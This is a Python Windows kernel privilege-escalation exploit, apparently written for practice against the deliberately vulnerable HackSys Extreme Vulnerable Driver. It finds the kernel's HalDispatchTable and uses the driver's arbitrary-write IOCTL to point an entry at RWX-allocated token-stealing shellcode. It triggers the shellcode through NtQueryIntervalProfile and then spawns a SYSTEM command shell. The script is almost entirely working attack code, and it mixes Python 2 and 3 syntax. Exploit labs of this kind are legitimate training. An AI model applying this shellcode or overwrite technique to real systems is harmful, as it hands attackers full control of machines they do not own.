import struct, sys, os
from ctypes import *
from subprocess import *

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi

def get_base_address():
	""" Returns base address of kernel modules """

	lpImageBase = (c_ulonglong * 1024)()
	lpcbNeeded = c_longlong()
	psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]

	driver_name_size = c_long()
	driver_name_size.value = 48
	psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))

	for base_addr in lpImageBase:
		driver_name = c_char_p(b"\x00" * driver_name_size.value)
		if base_addr:
			psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver_name.value.lower().find(b"krnl") != -1:
				print("[+] Retrieving kernel info...")
				print("[+] Kernel version: {}".format(driver_name.value))
				print("[+] Kernel base address: {:#x}".format(base_addr))

				return (base_addr, driver_name.value)
				
				return (base_addr, driver_name.value)
	return None

base_addr, current_name = get_base_address()

kernel32.LoadLibraryA.restype = POINTER(c_longlong) # Very important. For some reason LoadLibraryA only returns as 'int' instead of pointer
kernel_handle = kernel32.LoadLibraryA('ntoskrnl.exe')

kernel32.LoadLibraryA.restype = c_uint32 # Change it back to unsigned integer
kernel_base_addr = kernel32.LoadLibraryA('ntoskrnl.exe')

if not kernel_handle:
    print("[-] Failed to load kernel handle")
    exit(-1)
    
print("[+] Kernel Handle Loaded!")

# Get HALDispatchTable Address on kernel handle
userland_haladdr = kernel32.GetProcAddress(kernel_handle, b'HalDispatchTable')

print("[*] Userland Hal Address {}".format(hex(userland_haladdr)))

kernelland_haladdr = base_addr + userland_haladdr - kernel_base_addr + 0x8
print("[*] Kernelland Hal Address {}".format(hex(kernelland_haladdr)))

handle = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not handle or handle == -1:
    print "[+] Cannot get device handle."
    sys.exit(0)
	
	
print "[+] Successful opening device handle"

# Token Stealing Shellcode
shellcode = "\x50\x51\x52\x48\x31\xC0\x65\x48\x8B\x80\x88\x01\x00\x00\x48\x8B\x40\x70\x48\x89\xC1\x48\xC7\xC2\x04\x00\x00\x00\x48\x8B\x80\x88\x01\x00\x00\x48\x2D\x88\x01\x00\x00\x48\x39\x90\x80\x01\x00\x00\x75\xEA\x48\x8B\x90\x08\x02\x00\x00\x48\x89\x91\x08\x02\x00\x00\x5A\x59\x58"

shellcode = shellcode + "\xc3" # Need to add ret (0xc3) to go back to the calling function since it doesn't do it automatically otherwise blue screen appears

addr = kernel32.VirtualAlloc(
    c_int64(0),
    c_int(len(shellcode)),
    c_int(0x3000),
    c_int(0x40)
)

addr_ptr = kernel32.VirtualAlloc(
    c_int64(0),
    c_int(0x10),
    c_int(0x3000),
    c_int(0x40)
)

if not addr:
    print("[-] Failed to create virtualalloc")
    exit(-1)

print("[+] Successfully allocated RWX buffer")

memmove(addr, shellcode, len(shellcode))

addr_bytes = struct.pack("<Q", addr)
memmove(addr_ptr, addr_bytes, len(addr_bytes)) 

addr_ptr_bytes = struct.pack("<Q", addr_ptr)
print("[*] Virtual address is in {}".format(hex(addr)))

arbwrite_input = addr_ptr_bytes + struct.pack("<Q", kernelland_haladdr)

# 0x22200b came from hex ( (0x22 << 16) | (0x802 << 2) | (0x0 <<14 ) | 0x3 )
print("[+] Triggering Arbitrary Overwrite...")
kernel32.DeviceIoControl(handle, 0x22200b, arbwrite_input, len(arbwrite_input), None, 0, byref(c_ulong()), None)

print("[+] Triggering NtQueryIntervalProfile...")
ntdll.NtQueryIntervalProfile(0xdead, byref(c_ulong()))

print("[*] Initializing CMD")
os.system("cmd")
